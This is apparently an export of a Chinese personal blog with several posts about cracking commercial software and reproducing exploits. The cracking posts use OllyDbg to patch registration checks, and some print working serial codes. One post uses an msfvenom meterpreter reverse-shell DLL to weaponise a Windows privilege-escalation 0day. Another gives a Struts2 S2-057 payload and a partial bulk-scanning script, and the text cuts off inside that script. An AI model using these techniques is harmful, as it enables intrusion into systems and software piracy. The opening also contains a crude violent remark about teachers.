      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天暑假最后一天，我特么的不想上学。回到学校见到特么63个男的加见到丑的一批的班主任，就忍不住把那些老师全部打死，天天拿毕业证说事。<br><img src="https://s1.ax1x.com/2018/09/01/PxF9mT.jpg" alt="PxF9mT.jpg"> <img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=3988330260,3412584568&amp;fm=26&amp;gp=0.jpg" alt="u=3988330260,3412584568&amp;fm=26&amp;gp=0.jpg"></p><p><code>猫女被打爆了头...</code></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>恒大的课程看到了第九课，第八课的课件失踪了。到时候补上，我们拿到的课件的软件名叫做<br>QQ传情= =，这名字。。不管了，先来看看软件<br>首先打开软件，发现他让你注册，注册码瞎几把乱填。<br><img src="https://s1.ax1x.com/2018/09/01/PxF3hd.md.png" alt="PxF3hd.md.png"><br>然后点击注册软件，让你重启验证。<br><img src="https://s1.ax1x.com/2018/09/01/PxFG9A.png" alt="PxFG9A.png"><br>注册码当然是错误的，我们可以发现文件夹里有几个ini配置文件，值得关注的是Config.ini我们按进去看看打开软件也是没用注册。这里也没用像星空网游的那个软件一样重启验证后有提示，也就是说我们这里没用关键字！那我们该怎么办？先关闭软件吧。<br><img src="https://s1.ax1x.com/2018/09/01/PxFtjP.md.png" alt="PxFtjP.md.png"><br>然后查壳<br><img src="https://s1.ax1x.com/2018/09/01/PxFe6x.md.png" alt="PxFe6x.md.png"><br>无壳，然后载入OD<br><img src="https://s1.ax1x.com/2018/09/01/PxFK0O.png" alt="PxFK0O.png"><br>按照课程思路，按BP下一个<code>GetPrivateProfileStringA断点</code><br>(这个断点专门用来搞ini重启验证的)<br>然后F9运行程序，发现程序断在了断点上<br><img src="https://s1.ax1x.com/2018/09/01/PxFcj0.md.png" alt="PxFcj0.md.png"><br>然后我们发现我们从<code>程序领空进入到了系统领空</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">程序领空：OD左上角文件名如果文件是程序名就是程序领空</span><br><span class="line">系统领空：OD左上角文件名如果不是程序名的话就是系统领空</span><br></pre></td></tr></table></figure></p><p>系统领空<br><img src="https://s1.ax1x.com/2018/09/01/PxFoC9.md.png" alt="PxFoC9.md.png"><br>按Alt+F9或者调试按执行到用户代码跳出系统领空。<br>(跳到了程序领空)<br><img src="https://s1.ax1x.com/2018/09/01/PxF7g1.md.png" alt="PxF7g1.md.png"><br>F8单步往下走<br><img src="https://s1.ax1x.com/2018/09/01/PxFHjx.md.png" alt="PxFHjx.md.png"><br>发现了机器码，继续单步<br>发现一个retn 跳出<br><img src="https://s1.ax1x.com/2018/09/01/PxFqu6.md.png" alt="PxFqu6.md.png"><br>继续单步<br>又跳过了一个retn之后我们又一次的进入了<code>系统领空</code><br><img src="https://s1.ax1x.com/2018/09/01/PxFLDK.md.png" alt="PxFLDK.md.png"><br>Alt+F9再次跳出<br><img src="https://s1.ax1x.com/2018/09/01/PxFx4H.md.png" alt="PxFx4H.md.png"><br>之后我们发现了我们输入的假码<br><img src="https://s1.ax1x.com/2018/09/01/PxkSCd.png" alt="PxkSCd.png"><br>继续F8到retn 跳出这个call<br>又一次出现了我们的机器码，这是不是说明真码离我们很近了呢？<br><img src="https://s1.ax1x.com/2018/09/01/PxkKvq.md.png" alt="PxkKvq.md.png"><br>发现一个可疑字符串，将其复制到剪切板，继续单步往下走<br><img src="https://s1.ax1x.com/2018/09/01/Pxk0r6.md.png" alt="Pxk0r6.md.png"><br>在一次发现可疑字符串，记录下来。现在把OD关掉试一下注册码<br><img src="https://s1.ax1x.com/2018/09/01/PxkqRs.md.png" alt="PxkqRs.md.png"></p><p><img src="https://s1.ax1x.com/2018/09/01/PxAiW9.png" alt="PxAiW9.png"><br>第一次可疑字符串失败，第二个成功，所以<code>acdb9da597f5276c6e4aae7dd29b7524</code>就是注册码<br><img src="https://s1.ax1x.com/2018/09/01/PxAEsx.png" alt="PxAEsx.png"><br>转载请声明转自：422926799.github.io<br>我们下个星期在见<img src="https://s1.ax1x.com/2018/09/01/PxAmdO.png" alt="PxAmdO.png"></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解星空网游LEG阿里云破解补丁</title>
      <link href="/posts/f2b8431a.html"/>
      <url>/posts/f2b8431a.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Shark恒第七课，从这个PE中寻找真的注册码。虽然之前也说过，不过这个有点不一样。所以学习完之后这里做个总结。<br><img src="https://s1.ax1x.com/2018/08/31/Pv3sYt.jpg" alt="Pv3sYt.jpg"></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先我们来分析一下软件，我们输入注册码后他会将注册码写入到配置文件，然后进行重启验证。<br>由此我们可以判断，他是打开ini读取里面的配置和真码进行比较。我们要做的就是将软件停留在那段时间。<br><img src="https://s1.ax1x.com/2018/08/31/Pv8E0H.md.png" alt="Pv8E0H.md.png"><br>常规操作先查壳，在载入OD。<br><img src="https://s1.ax1x.com/2018/08/31/Pv3Tf0.png" alt="Pv3Tf0.png"><br>vmp的壳，然后载入OD<br><img src="https://s1.ax1x.com/2018/08/31/Pv8M1f.md.png" alt="Pv8M1f.md.png"><br>在API断点下一个ReadFile断点<br><img src="https://s1.ax1x.com/2018/08/31/Pv8YAs.md.png" alt="Pv8YAs.md.png"><br>F9运行程序，发现程序成功的断在了读取文件的位置<br><img src="https://s1.ax1x.com/2018/08/31/Pv8cNR.md.png" alt="Pv8cNR.md.png"><br>Ctrl+G输入401000去到解码处，为什么要去解码处呢？因为有壳<br><img src="https://s1.ax1x.com/2018/08/31/Pv8hjO.md.png" alt="Pv8hjO.md.png"><br>中文搜索引擎-&gt;ASCII搜索-&gt;发现关键字<br><img src="https://s1.ax1x.com/2018/08/31/Pv8b4I.md.png" alt="Pv8b4I.md.png"><br>双击跳反汇编窗口，发现关键跳<br><img src="https://s1.ax1x.com/2018/08/31/PvG9Ej.md.png" alt="PvG9Ej.md.png"><br>在关键跳下断点，停止掉读取文件的断点<br><img src="https://s1.ax1x.com/2018/08/31/PvGA2V.png" alt="PvGA2V.png" border="0"></p><p><img src="https://s1.ax1x.com/2018/08/31/PvGk80.png" alt="PvGk80.png" border="0"><br>F9运行程序，发现真码！！！<br><img src="https://s1.ax1x.com/2018/08/31/PvGaad.png" alt="PvGaad.png" border="0"><br>真码为12759E371EF9175DC77CC79BC7716312<br><img src="https://s1.ax1x.com/2018/08/31/PvGUVH.png" alt="PvGUVH.png" border="0"><br>关闭OD输入注册码，发现注册成功<br><img src="https://s1.ax1x.com/2018/08/31/PvGTMT.png" alt="PvGTMT.png" border="0"><br><img src="https://s1.ax1x.com/2018/08/31/PvGIzV.png" alt="PvGIzV.png" border="0"><br>转载请声明：来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows-提权0day-复现</title>
      <link href="/posts/c24b1fd3.html"/>
      <url>/posts/c24b1fd3.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><embed src="//music.163.com/style/swf/widget.swf?sid=33856586&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"><p>win10中任务调度服务导出的函数没有验证调用者的权限，任意权限的用户调用该函数可以获取系统敏感文件的写权限，进而提权。影响范围：windows10，windows server 2016昨天群里的基友们都复现了一遍也都成功了，也有基友在windows8实验了发现了也能提权成功。</p><p><img src="https://s1.ax1x.com/2018/09/01/Pximdg.jpg" alt="Pximdg.jpg" border="0"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>准备工作：下载POC，windows 10 镜像，Process Explorer，CFF<br>POC：<a href="https://github.com/SandboxEscaper/randomrepo" target="_blank" rel="noopener">GitHub - SandboxEscaper/randomrepo: Repo for random stuff</a><br>windows10 ISO:msdn下载<br>Process Explorer：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" rel="noopener">Process Explorer - Windows Sysinternals | Microsoft Docs</a><br>CFF:<a href="https://ntcore.com/?page_id=388" target="_blank" rel="noopener">Explorer Suite – NTCore</a></p><p>首先打开一个notepad<br><img src="https://s1.ax1x.com/2018/09/01/Pxi3Q0.png" alt="Pxi3Q0.png" border="0"><br>并没有什么不同，执行<br><img src="https://s1.ax1x.com/2018/09/01/PxinoQ.md.png"><br>带有子进程conhost和notepad的cmd.exe已经生成为SYSTEM！</p><h3 id="将其武器化"><a href="#将其武器化" class="headerlink" title="将其武器化"></a>将其武器化</h3><p>在kali执行 <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll &gt; ka.dll</code><br><img src="https://s1.ax1x.com/2018/08/31/PvFgQP.md.png" alt=""><br>移动到windows10<br><img src="https://s1.ax1x.com/2018/09/01/PxiMJs.md.png"><br>在CFF打开<code>ALPC-TaskSched-LPE.dll</code>替换其msf生成的dll，然后保存<br><img src="https://s1.ax1x.com/2018/09/01/PxiGLT.md.png"></p><p><img src="https://s1.ax1x.com/2018/09/01/PxiQWn.md.png"><br>kali中执行监听命令<br><img src="https://s1.ax1x.com/2018/09/01/PxiVL8.md.png"><br>windows 10中执行<br><img src="https://s1.ax1x.com/2018/09/01/PxiEsf.md.png"><br>返回kali可以发现已经成功的反弹了一个meterpreter，并且是system权限<br><img src="https://s1.ax1x.com/2018/09/01/Pxilzq.md.png"></p><p><img src="https://s1.ax1x.com/2018/09/01/Pxi8yV.md.png"></p><p><img src="https://s1.ax1x.com/2018/09/01/PxieeS.md.png"></p><p>分析此0day的文章：<a href="https://www.anquanke.com/post/id/158293" target="_blank" rel="noopener">漏洞预警 | Windows 10本地提权0day预警 - 安全客，安全资讯平台</a><br>转载请注明来自：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件巴士破解</title>
      <link href="/posts/bdce5981.html"/>
      <url>/posts/bdce5981.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>看到恒大教程的第六课，vmp壳的爆破。然后按照教程上的软件找，发现完全不是一个壳。我日….啊，这篇当做复习在壳中破解吧。<br><img src="https://i.imgur.com/udnIbzS.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先查壳<br><img src="https://i.imgur.com/02YASBk.png" alt=""><br>UPX的壳，不管他。不影响大局<br>将文件巴士拖入OD<br><img src="https://i.imgur.com/dFTGw0D.png" alt=""><br>直接运行软件，然后按F9跳转到401000<br><img src="https://i.imgur.com/z0m2Fs7.png" alt=""><br>搜索关键字(注册失败）<br><img src="https://i.imgur.com/xBB90rd.png" alt=""><br>双击跳转到反汇编窗口区域<br><img src="https://i.imgur.com/hNoUCtL.png" alt=""><br>往上找跳转<br><img src="https://i.imgur.com/FtVenyN.png" alt=""><br>发现关键跳，直接跳过了正确。使用noop填充<br><img src="https://i.imgur.com/YiBYNbE.png" alt=""><br>运行软件，乱输即可注册成功<br><img src="https://i.imgur.com/Y9vHv31.png" alt=""><br>转载请声明来自:422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>关键call和关键跳</title>
      <link href="/posts/f60102e8.html"/>
      <url>/posts/f60102e8.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>恒大的教程去到第五课，关修改关键call的值实现破解。这里也跟着学习了一遍，关键跳的上面有个关键call。而关键call是决定关键跳是否跳转的主要因素。</p><p><img src="https://i.imgur.com/HiZBHxU.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>这里用到的是教程里面的视频转换专家，百度上找一个下载。<br>首先先查壳<br><img src="https://i.imgur.com/a5ubBJ7.png" alt=""><br>查壳之后发现无壳，拖入OD进行分析。<br><img src="https://i.imgur.com/kMoWiy7.png" alt=""><br>搜索关键字”注册”，找到一个双击跳转<br><img src="https://i.imgur.com/5MqKTN6.png" alt=""><br><img src="https://i.imgur.com/UH6FmTP.png" alt=""><br>往上移看看能不能找到什么线索，发现一个跳转<br><img src="https://i.imgur.com/8i3Rh8A.png" alt=""><br>这个跳转跳过了注册成功，我们不要让他成功，可以使用Noop填充之类的操作。但是我们这次要学习的修改call的值，我们看看上面的call。下个断点，然后F9运行程序输入假码看看。<br><img src="https://i.imgur.com/CcaSR3l.png" alt=""><br>从call中我们可以发现，里面有我们输入的假码。F8单步像下看看<br><img src="https://i.imgur.com/H9oJZqc.png" alt=""><br>test al,al 可以看出EAX和ECX在进行比较。如果为1则注册成功，如果为0则注册不成功。而这一切的罪魁祸首就是call，所以我们进入call中进行修改(手动滑稽啦)<br><img src="https://i.imgur.com/bxQQwIT.jpg" alt=""><br>F7进入call<br><img src="https://i.imgur.com/Ek3PAwh.png" alt=""><br>修改如下图所示<br>mov eax,1(将1赋值给eax) retn（退出call）<br><img src="https://i.imgur.com/H11hDP7.png" alt=""><br>然后选择修改的部分复制到可执行文件，将其保存。<br><img src="https://i.imgur.com/Dkdk4bL.png" alt=""><br>发现已经按不了了，代表已经注册了。</p><p>转载请注明:来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>去除文件自效验</title>
      <link href="/posts/8e2ff5f8.html"/>
      <url>/posts/8e2ff5f8.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>学到Shark恒的第四课，去除文件自效验。何为文件自效验呢？当你脱壳之后，因为现在壳都有压缩功能。所有脱壳之后文件会变大，如果文件变大了。如果PE有检测文件大小功能，如果文件大小不等于<br>有壳时候的大小就会退出PE。判断是否有自效验就是，脱壳后PE打不开。<br><img src="https://i.imgur.com/cqRHQZL.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先下载课程中所用到的，木马杀客</p><pre><code>http://www.xdowns.com/soft/8/21/2006/Soft_29666.html</code></pre><p>首先下载出来之后。我们把exe拖入进行检测，发现有个壳子。<br><img src="https://i.imgur.com/qQO7Bfi.png" alt=""><br>拖入OD，发现可以用ESP定律脱掉(ESP定律昨天我已经说过了这里就不重复多说)<br><img src="https://i.imgur.com/MIUZtOT.png" alt=""><br>脱掉壳之后的对比和大小<br><img src="https://i.imgur.com/unSY03R.png" alt=""></p><p><img src="https://i.imgur.com/0Y0iO8j.png" alt=""><br>运行1.exe发现打不开(判断有文件自效验)。将1.exe拖入OD，点击常用API断点设置，设置文件大小断点。<br><img src="https://i.imgur.com/Z5yzVqr.png" alt=""><br>F9运行。<br><img src="https://i.imgur.com/509GloA.png" alt=""><br>右键反汇编窗口跟随<br><img src="https://i.imgur.com/OiZDMpG.png" alt=""><br>跳到判断参数，下断点<br><img src="https://i.imgur.com/Ulg1W0P.png" alt=""><br>将文件大小那个断点禁止。<br><img src="https://i.imgur.com/InDNk8n.png" alt=""><br>F9运行，发现断在了这个位置<br><img src="https://i.imgur.com/bKb8LPi.png" alt=""><br>F8单步…<br><img src="https://i.imgur.com/Wo0uEki.png" alt=""><br>（cmp:cmp用于比较两个数值的大小，如果不是加壳后的大小则会直接return退出）这里我们不能让他退出，对两个cmp使用noop填充。<br><img src="https://i.imgur.com/xiRWY4c.png" alt=""><br>复制到可执行文件然后保存<br><img src="https://i.imgur.com/luAvfEa.png" alt=""><br>保存为2.exe<br><img src="https://i.imgur.com/5gh69iv.png" alt=""><br>成功打开<br><img src="https://i.imgur.com/33Z3fqB.png" alt=""><br>转载请注明转自:422926799.github.io<br>欢迎加入即刻安全技术交流群:307283889</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ESP定律</title>
      <link href="/posts/7e162ea7.html"/>
      <url>/posts/7e162ea7.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Shark恒的教程，学到第四课，自验证涉及到ESP定律进行脱壳。然后我去看了一遍，发现还行。这里做个总结。</p><p><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=4065195853,3923124275&amp;fm=11&amp;gp=0.jpg" alt=""></p><pre><code>全职猎人看到了嵌合蚁篇</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先这里自己找个exe用吾爱工具的，ASP加壳工具进行加壳。用PEID查壳可以发现是ASP壳<br><img src="https://i.imgur.com/AP2j6lR.png" alt=""><br>拖入OD，并进行一次单步，发现有Pushad而且单步之后也只有ESP后面出现红色说明可以使用ESP定律进行脱壳<br><img src="https://i.imgur.com/k2RDX53.png" alt=""><br>然后将鼠标移到ESP值那里右键单击数据窗口中跟随<br><img src="https://i.imgur.com/8aQCmo2.png" alt=""><br>选中跟随的值，多少无所谓只要是开头的就行<br><img src="https://i.imgur.com/uwvXxbY.png" alt=""><br>右键单击断点，硬件断点，三选一<br><img src="https://i.imgur.com/2jsRRPp.png" alt=""><br>断点之后按调试-&gt;硬件断点可以看见<br><img src="https://i.imgur.com/MRJtmJH.png" alt=""><br>按F9运行，然后F8单步(让他跳到call)<br><img src="https://i.imgur.com/mtcu2kb.png" alt=""><br>鼠标右键点击插件进行脱壳，保存<br><img src="https://i.imgur.com/THC7jZC.png" alt=""><br>在次查壳，发现已经脱了。<br><img src="https://i.imgur.com/finyVAV.png" alt=""></p><p>ESP定律还有更简单的方法，就是你单步了之后把鼠标移到ESP值那里选择ESP那个插件，然后步骤同上。</p><p>转载请注明来自：422926799.github.io</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>破解飞扬英语2010版</title>
      <link href="/posts/8bbe2fae.html"/>
      <url>/posts/8bbe2fae.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>每天睡觉前看个Shark恒的破解教程，起床来学破解。真特么的爽歪歪，我看到了第三课，然后我们就来破解吧。<br><img src="https://i.imgur.com/EyXI3m8.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先下载教程里面所说的exe，飞扬英语学习(带壳破解)：</p><pre><code>http://www.greenxf.com/soft/20907.html</code></pre><p>之后先安装，查壳。<br><img src="https://i.imgur.com/KjtpqsM.png" alt=""><br>运行exe点击购买，随便输用户名和注册码<br><img src="https://i.imgur.com/4Ixm1qZ.png" alt=""><br>然后软件会让你重启<br><img src="https://i.imgur.com/L6AyPWF.png" alt=""><br>之后将软件拖入到OD，打开<br><img src="https://i.imgur.com/RBMX7A9.png" alt=""><br>因为是带壳所以会出现以上毛病，点是或否就行，然后F9运行<br><img src="https://i.imgur.com/IPkTpGj.png" alt=""><br>回到教程，按Ctrl+G或者黑色的箭头-&gt;输入401000<br><img src="https://i.imgur.com/ZFaU1B3.png" alt=""><br>(401000跳转到头部，根据Shark恒所说%90的壳可以成功)<br><img src="https://i.imgur.com/3iZF6do.png" alt=""><br>然后可以看见脱离了壳<br><img src="https://i.imgur.com/zhBIgmi.png" alt=""><br>点击分析-&gt;从模块中删除数据分析<br><img src="https://i.imgur.com/zBcE7FY.jpg" alt=""><br>就会恢复正常，然后中文搜索-&gt;智能搜索（未购买）<br><img src="https://i.imgur.com/ZZ7UqQP.png" alt=""><br>双击跳转到CPU区<br><img src="https://i.imgur.com/rPXGmYP.png" alt=""><br>向上找找存储的地方，然后发现了注册表的路径，我们给他加个注释<br><img src="https://i.imgur.com/P1mfRXv.png" alt=""><br>然后F2断点<br><img src="https://i.imgur.com/KB5S9az.png" alt=""><br>按那个嘿嘿的返回键，返回，点击插件-&gt;常用API插件找到启动断点的<br><img src="https://i.imgur.com/FpgBtbQ.jpg" alt=""><br>因为有壳所有会出现以下这点（确认即可）<br><img src="https://i.imgur.com/7DUfyoD.png" alt=""></p><p><img src="https://i.imgur.com/nDtcQ4p.png" alt=""><br>按F9运行<br><img src="https://i.imgur.com/2dWYuEd.png" alt=""><br>然后按OD列表上方的b按钮，跳到断点设置将获取启动信息的断点停止，注册表设置的断点启动。<br><img src="https://i.imgur.com/av5V7q6.png" alt=""><br><img src="https://i.imgur.com/jkoO7rv.png" alt=""><br>之后返回到反汇编区，按F9再次运行，发现断点成功断到了注册表那里<br><img src="https://i.imgur.com/JtZRacM.png" alt=""><br>慢慢的往下面单步就可以发现真码了（注册码）<br><img src="https://i.imgur.com/nylj5Q1.png" alt=""></p><p><img src="https://i.imgur.com/gWTHuOf.png" alt=""></p><p><img src="https://i.imgur.com/XHF5j1G.png" alt=""></p><p><img src="https://i.imgur.com/vfb0kXt.png" alt=""><br>复制出真码将其注册<br><img src="https://i.imgur.com/W5iYK7q.png" alt=""></p><p><img src="https://i.imgur.com/hDckGp3.png" alt=""></p><p><img src="https://i.imgur.com/Cf5Gb6P.png" alt=""></p><p>破解成功（带壳寻找注册码）。</p><p>这三天来的总结</p><pre><code>带壳寻找注册码（90%的壳可以用401000找到初始位）PEID查壳，把exe拖入OD，直接运行程序。因为带壳，按Ctrl+g或黑色的向前指的箭头，输入401000。如果未解码，则按分析-&gt;删除模块分析然后进行智能搜索搜索关键字（未购买），然后双击跳到CPU区。往上寻找“注册表的路径”。找到之后按F2下好断点，之后按&lt;&lt;&lt;退回键按API断点工具-&gt;常用断点工具-&gt;常用断点工具，勾选&quot;初始化断点&quot;确定。按F9发现程序被断了，之后在OD上方列表找到b。按b将初始化断点禁用，注册表那个断点开启，然后按F9，跳到注册表那个断点哪里。按F8进行单步调试，之后你会看到假码和真码，一般来说如果有真码的话CPU区的左侧第三栏会出现一个0x几的。然后发现下一步是对比用户名和真码，这就是真码了。Shark恒的第三课利用了，软件在输入后重启那段空间把软件进行断了下来然后搜索真码存在的路径，进行调试从而找到真码破解不联网登陆软件常规思路就是:查壳，脱壳，然后拖入od，看看他有没有跳过什么，如果是红色线跳转的话noop填充把跳转删了，如果是灰色线跳转不超过的话，把开始跳转的汇编代码改为jmp 无条件跳转，如果有个x前面加个0</code></pre><p>转载请注明文章来自：422926799.github.io<br>欢迎加入即刻安全技术交流群：307283889</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解劳保用户管理系统</title>
      <link href="/posts/10ddccc5.html"/>
      <url>/posts/10ddccc5.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>昨天在即刻群里面窥屏，发现一个shark恒的破解教程。我用“念”去查看，嗯发现这是个不错的东西（完全扯淡），昨天晚上就看了。心里痒想破解（手动滑稽），今天下午找到了劳保管理系统2012的软件，破解成功了。故此来做个记录<br><img src="https://i.imgur.com/IHsMSOc.jpg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先劳保软件管理系统下载：<a href="http://www.duote.com/soft/121.html" target="_blank" rel="noopener">http://www.duote.com/soft/121.html</a><br>准备好工具，OD，EXEInfoPE或者PEID<br>按照昨天学习的操作：</p><pre><code>先查壳，将下载好的exe拖入EXEInfoPE查壳（我这里用的是EXEInfoPE）</code></pre><p><img src="https://i.imgur.com/1OVe1zG.png" alt=""><br>没有壳，进行软件测试。</p><pre><code>打开界面，瞎输，发现有4次机会，如果全部错误则会弹出登陆框</code></pre><p><img src="https://i.imgur.com/FzvkjGy.png" alt=""></p><p><img src="https://i.imgur.com/wEbItRg.png" alt=""><br>继续回到昨天的操作，将exe拖入到OD里面<br><img src="https://i.imgur.com/oPwcGHf.png" alt=""><br>进行字符搜索，搜索关键字：密码错误<br><img src="https://i.imgur.com/vKi8lYJ.png" alt=""><br>双击跳到，CPU区。<br><img src="https://i.imgur.com/C6mF7FE.png" alt=""></p><pre><code>从图中可以看出 &gt; //跳转符还有红色的线代表跳转，灰色的线代表跳转不成功</code></pre><p>现在移到红线的上方<br><img src="https://i.imgur.com/EFZFAsD.png" alt=""><br>jnz代表条件跳转<br><img src="https://i.imgur.com/9h0x7X8.png" alt=""><br>然后我们下个断点，进行软件运行测试。<br><img src="https://i.imgur.com/wgg4U5B.png" alt=""><br>运行软件，发现断点的地方变成白底红字（说明软件运行在这了）<br><img src="https://i.imgur.com/VX9WTO7.png" alt=""><br>F8单步调试，看看<br><img src="https://i.imgur.com/bourawt.png" alt=""><br>跳转到了密码错误，在回到昨天晚上学习的操作，在断点处进行Noop填充<br><img src="https://i.imgur.com/HFK6Exo.png" alt=""><br>noop填充就是，等于把这个跳转删除了。然后在单步看看<br><img src="https://i.imgur.com/enL8Ce4.png" alt=""><br>跳过了密码错误，我们在运行软件看看</p><p>乱输一通，发现登陆成功了！！！<br><img src="https://i.imgur.com/sfeDmnM.png" alt=""><br><img src="https://i.imgur.com/9ZJUHyh.png" alt=""><br>然后破解的软件即可。</p><p><strong>总结：</strong></p><pre><code>逆向第一课总结:1.首先判断软件有没有加壳，用peid看，如果加了壳就找对应的脱壳工具，进行脱壳。2.然后运行软件，观察软件的运行。获取关键字。如:密码错误的那个3.把软件拖入od进行搜索关键字，双击关键字的那行。然后跳到CPU区，进行断点。f6运行程序看程序是不是跳到哪里。如果跳转成立的线是红色的，不成立则为灰色，跳转标识符&gt;，然后进行noop填聪(就是什么也没有)，然后软件就破解了。自己可以考虑用C写个简单的登陆程序，进行破解。完毕注意:搜索用智能搜索，搜索关键字要模糊化，不要全部打上。搜索跳转到CPU区之后先看软件的运行流程，分析软件，下断点，按f6运行程序进行调试。然后进行下一步。破解完后如果要进行保存，点击复制到可执行文件，选择，保存文件。给他取个名字</code></pre><p>欢迎加入即刻安全技术交流群：307283889<br>转载请声明转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>St2-057复现</title>
      <link href="/posts/c6d4c6f1.html"/>
      <url>/posts/c6d4c6f1.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>距离愉快的暑假还有10天左右、、十分不想上学…..,今天呢st-057的细节和复现教程出炉了。抱着一试的决心，emm失败了。还好下午有为潜水大佬出来送了份环境<br><img src="https://i.imgur.com/yT2oSJ3.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>漏洞介绍：<br><img src="https://i.imgur.com/WCtYf57.png" alt=""><br>漏洞详情：</p><pre><code>https://github.com/vulhub/vulhub/tree/master/struts2/s2-048https://lgtm.com/blog/apache_struts_CVE-2018-11776https://cwiki.apache.org/confluence/display/WW/S2-057https://www.anquanke.com/post/id/157518</code></pre><p><strong>搭建st2-057环境：</strong><br>这里有两种方法：</p><pre><code>1.按照少宇师傅的方法来搭建，但是我失败了。链接：https://github.com/jas502n/St2-057/2.用潜水大佬给我的环境，环境下载：https://pan.baidu.com/s/1lXIHwqEQP-bjqw5A4fvOIA 密码: b7k6 github下载地址：https://github.com/422926799/st2-057</code></pre><p>如果你选择按照少宇师傅的搭建方法则看<a href="https://github.com/jas502n/St2-057/" target="_blank" rel="noopener">https://github.com/jas502n/St2-057/</a></p><p>回到正题，下载之后。</p><pre><code>unzip cve201811776.zipdocker-compose up -d</code></pre><p>访问：<a href="http://127.0.0.1/struts2-showcase" target="_blank" rel="noopener">http://127.0.0.1/struts2-showcase</a><br><img src="https://i.imgur.com/BZmoCIq.png" alt=""><br>根据少宇师傅的教程，加入payload${(111+111)}</p><pre><code>http://www.127.0.0.1:8080/struts2-showcase/${(111+111)}/actionChain1.action</code></pre><p>然后测试结果如下：<br><img src="https://i.imgur.com/8L24a6G.png" alt=""><br><img src="https://i.imgur.com/zciP0nQ.png" alt=""><br>其他payload我试了不行，如果要试请自行测试。</p><p>然后我们可以通过上面的那个payload写一个批量测试St2-057的脚本：<br><strong>代码：</strong></p><pre><code>import requestsimport threadingimport osxh=open(&apos;save.txt&apos;,&apos;w&apos;)xh.close()def scan(url):    payload=&apos;${(111+111)}&apos;    urls=&apos;{}/struts2-showcase&apos;.format(url)+&apos;/struts2-showcase/{}/actionChain1.action&apos;.format(payload)    headers={&apos;user-aget&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;}    try:        reqt=requests.get(url=urls,headers=headers,timeout=10)        if &apos;{}/struts2-showcase/struts2-showcase/222/register2.action&apos;.format(url) == reqt.url: //判断是否等于相加的结果            print(&apos;[+]st-057 url:{}&apos;.format(reqt.url))            print(&apos;[+]st-057 url:{}&apos;.format(reqt.url),file=open(&apos;save.txt&apos;,&apos;a&apos;))        else:            print(&apos;[-]Not st-057 url:{}&apos;.format(reqt.url))    except Exception as e:        print(&apos;[-]Error {}&apos;.format(e))if __name__ == &apos;__main__&apos;:    while True:        user=input(&apos;url.txt:&apos;)        if os.path.exists(user):            print(&apos;[+]{} existence&apos;.format(user))            break        else:            print(&apos;[-]Not existence {}&apos;.format(user))            continue    dk=open(&apos;{}&apos;.format(user),&apos;r&apos;)    for r in dk.readlines():        qc=&quot;&quot;.join(r.split(&apos;\n&apos;))        